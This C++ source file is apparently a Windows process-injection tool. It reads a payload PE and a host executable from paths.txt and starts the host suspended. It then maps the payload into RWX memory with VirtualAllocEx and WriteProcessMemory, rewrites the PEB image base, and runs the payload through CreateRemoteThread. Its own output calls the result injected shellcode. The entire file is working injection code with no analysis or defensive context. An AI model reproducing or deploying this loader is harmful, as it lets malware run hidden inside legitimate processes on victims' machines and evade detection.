#include <iostream>
#include <Windows.h>
#include <fstream>
#include <filesystem>
#include <string>
#include <strsafe.h>

#include "hdr/shellcode.h"
#include "hdr/funcs.h"


int main() {
    if (!std::filesystem::exists("paths.txt")) {
        std::cerr << "paths.txt not found in directory\n";
        std::cin.get();
        return 1;
    }

    std::ifstream inputFile("paths.txt");
    std::string filename;
    std::string injectPath;

    if (std::getline(inputFile, filename)) {
        if (std::getline(inputFile, injectPath)) {
            ;
        }
        else {
            std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
            std::cin.get();
            return 1;
        }
    }
    else {
        std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
        std::cin.get();
        return 1;
    }

    inputFile.close();

    // if you wish to hardcode the shellcode, remove both of these, the stuff above and head to hdr/shellcode.h
    std::streamsize size;
    unsigned char* shellcode = getPEbytes(filename, size);

    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)shellcode;
    PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(shellcode + DosHeader->e_lfanew);

    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };

    ULONG_PTR retlen;
    PROCESS_BASIC_INFORMATION pbi;
    void* newImgBase;
    DWORD64 ImgBaseAddress;

    HMODULE ntDll = LoadLibraryA("ntdll.dll");
    NTQUERYINFOPROC64 NtQueryInformationProcess = (NTQUERYINFOPROC64)GetProcAddress(ntDll, "NtQueryInformationProcess");

    if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return 1;
    }

    if (!CreateProcess(injectPath.c_str(),
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &retlen
    );

    newImgBase = VirtualAllocEx(
        pi.hProcess,
        NULL,
        NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (newImgBase == NULL) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    WriteProcessMemory(pi.hProcess, newImgBase, shellcode, NtHeader->OptionalHeader.SizeOfHeaders, 0);

    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(shellcode + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
        if (!WriteProcessMemory(pi.hProcess,
            (LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress),
            (LPVOID)((DWORD64)shellcode + SectionHeader->PointerToRawData),
            SectionHeader->SizeOfRawData,
            0)) {
            std::cerr << "Failed to write section: " << GetLastError() << std::endl;
        }
        SectionHeader++;
    }

    ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
        std::cerr << "Failed to write ImgBaseAddress: " << GetLastError() << std::endl;
    }

    HANDLE NewThread = CreateRemoteThread(pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint),
        NULL,
        CREATE_SUSPENDED,
        NULL);


    SuspendThread(pi.hThread);
    ResumeThread(NewThread);

    printPlus(); std::cout << "DosHeader: " << std::hex << "0x" << DosHeader;
    printPlus(); std::cout << "NtHeader: " << std::hex << "0x" << NtHeader;
    printPlus(); std::cout << "Shellcode injected successfully\n";

    FreeLibrary(ntDll);
    std::cin.get();
    return 0;
}